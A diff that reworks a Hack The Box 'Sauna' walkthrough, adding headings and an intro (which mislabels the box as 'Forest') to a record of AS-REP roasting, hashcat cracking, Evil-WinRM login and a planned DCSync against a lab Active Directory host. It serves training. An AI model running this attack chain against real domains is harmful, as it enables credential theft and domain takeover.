@@ -1,4 +1,16 @@
-Nmap 
+# Hack The Box - Sauna Walkthrough 
+
+The [Forest](https://app.hackthebox.com/machines/Sauna) machine is an easy Windows Machine with a strong focus on Active Directory exploitation. Here, some knowledge about AD and being able to read a Bloodhound graph should be enough to clear the box.
+
+If you didn’t solve this challenge and just look for answers, first, you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints about interesting attack paths when dealing with an Active Directory.
+
+## Reconnaissance
+In a penetration test or red team, reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting.
+
+This information can then be leveraged by an adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute initial access, to scope and prioritize post-compromise objectives, or to drive and lead further reconnaissance efforts. Here, our only piece of information is an IP address.
+
+
+### Nmap Scan
 
 ```bash
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/sauna]
@@ -43,7 +55,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 86.20 seconds
 ```
 
-Rustscan
+### Rustscan
 
 ```bash
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/sauna]
@@ -130,7 +142,7 @@ Read data files from: /usr/bin/../share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 0.81 seconds
 ```
 
-Enumerating SMB services
+### Enumerating SMB services
 
 ```bash
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/sauna]
@@ -154,7 +166,7 @@ SMB         10.10.10.175    445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\:
 SMB         10.10.10.175    445    SAUNA            [-] Error enumerating shares: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
 ```
 
-RPCclient
+### RPCclient
 
 ```bash
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/sauna]
@@ -163,7 +175,7 @@ Password for [WORKGROUP\]:
 Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
 ```
 
-Visiting the website
+### Visiting the website
 
 ![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/3f349264-17d1-47ec-9240-26782a282c62/3cf9834f-e4e2-4fad-819e-80c02dc43f28/Untitled.png)
 
@@ -182,7 +194,7 @@ Shaun Colins
 Sophie Driver
 ```
 
-LDAPsearch
+### LDAPsearch
 
 ```bash
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/sauna]
@@ -376,7 +388,7 @@ result: 0 Success
 # numReferences: 3
 ```
 
-Using Kerbrute to brute-force usernames
+### Using Kerbrute to brute-force usernames
 
 ```bash
 ┌──(darshan㉿kali)-[/opt]
@@ -430,7 +442,7 @@ Version: v1.0.3 (9dad6e1) - 01/17/24 - Ronnie Flathers @ropnop
 2024/01/17 09:58:24 >  Done! Tested 6 usernames (1 valid) in 0.247 seconds
 ```
 
-Using [GetNPUsers.py](http://GetNPUsers.py) to perform AS-REP Roasting (When you try to request authentication through Kerberos, first the requesting party has to authenticate itself to the DC. But there is an option, `DONT_REQ_PREAUTH` where the DC will just send the hash to an unauthenticated user. AS-REP Roasting is looking to see if any known users happen to have this option set.) which will give us the hashes used during pre-authentication
+### Using [GetNPUsers.py](http://GetNPUsers.py) to perform AS-REP Roasting (When you try to request authentication through Kerberos, first the requesting party has to authenticate itself to the DC. But there is an option, `DONT_REQ_PREAUTH` where the DC will just send the hash to an unauthenticated user. AS-REP Roasting is looking to see if any known users happen to have this option set.) which will give us the hashes used during pre-authentication
 
 ```bash
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/sauna]
@@ -451,7 +463,7 @@ $krb5asrep$23$FSMITH@EGOTISTICAL-BANK.LOCAL:558bbc64e45a3f82dff87fe458a03c6c$45b
 $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:5f84f0e3034dbe8f3ffbc9f5c1ebbd8d$b525fe2d7f343cf078d56a6384461a111a37306f7b83ed8b5ac7fd9ad084d50fd755dac07169ba02681f571312c23b8d3b914881f5a6057beed11c968aee060859f2ab981d4f12a0a47d2f6ebc63f7abc166539d9610f1e285da0d02ee98c9bfeeb64129dda0b1cd7aef384f98a710be8b936a50fc54c08d2fcc891ce14912d20004616320ca2983ac14f4bdd0cc4cc40a8514b3761d9b972e30c3655c82b0e0faabaf9a776813cdc6d83c24206d80aa55b378fa06b6ac5bb2dd9f3ae6bddb2476e1e1795f1c62bac9529b0e7265106c1061a641c54faeea205c99926aeddb127b6feb7853aff339e12ed39beda0e8f95aaa2948311aa6a593f994954aa00b08
 ```
 
-Cracking the hash using `hashcat`
+### Cracking the hash using `hashcat`
 
 ```bash
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/sauna]
@@ -537,7 +549,7 @@ Started: Wed Jan 17 10:18:03 2024
 Stopped: Wed Jan 17 10:18:23 2024
 ```
 
-Using the cracked password to login as `fsmith` through `Evil-WinRM`
+### Using the cracked password to login as `fsmith` through `Evil-WinRM`
 
 ```bash
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/sauna]
@@ -554,7 +566,7 @@ Info: Establishing connection to remote endpoint
 egotisticalbank\fsmith
 ```
 
-User flag
+### User flag
 
 ```bash
 *Evil-WinRM* PS C:\Users\FSmith\Documents> cd ..
@@ -563,7 +575,7 @@ User flag
 ...SNIP...
 ```
 
-PrivEsc
+## PrivEsc
 
 ```bash
 *Evil-WinRM* PS C:\Users\FSmith\Documents> whoami /priv
@@ -578,7 +590,7 @@ SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 ```
 
-Uploading and running `winPEAS`
+### Uploading and running `winPEAS`
 
 ```bash
 Evil-WinRM* PS C:\Users\FSmith\Documents> upload winPEASx64.exe
@@ -735,7 +747,7 @@ After running `Bloohound`, I found an expoit path for privesc.
 
 So gotta use a `DCSync` Attack to get `administrator` access.
 
-Running ‘secretsdump.py’ to get the NTLM hashes 
+### Running ‘secretsdump.py’ to get the NTLM hashes 
 
 ```bash
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/sauna]
@@ -791,7 +803,7 @@ egotisticalbank\administrator
 C:\>
 ```
 
-Root Flag
+### Root Flag
 
 ```bash
 C:\>dir
